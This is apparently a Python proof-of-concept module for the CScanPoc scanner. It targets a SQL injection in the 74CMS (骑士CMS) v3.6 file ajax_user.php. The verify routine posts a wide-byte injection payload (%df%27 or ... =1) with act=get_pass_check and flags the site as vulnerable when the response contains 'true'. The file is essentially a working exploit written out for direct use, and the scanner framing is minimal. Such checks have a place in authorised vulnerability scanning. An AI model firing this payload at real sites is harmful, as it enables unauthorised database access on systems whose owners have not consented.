# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = '74CMS_0021'  # 平台漏洞编号，留空
    name = '骑士CMS 后台SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-08-02'  # 漏洞公布时间
    desc = '''
        文件位置： ajax_user.php，当act为get_pass_check时，出现了注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3981/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '74CMS(骑士CMS)'  # 漏洞应用名称
    product_version = 'v3.6_20150902'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b4ab6001-5d98-4583-9281-2901118ebd90'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/plus/ajax_user.php'
            data = "sunrain%df%27%20or%20%df%271%df%27=%df%271&act=get_pass_check"
            url = self.target + payload
            r = requests.post(url, data=data)

            if r.status_code == 200 and 'true' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;SQL注入漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name,url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
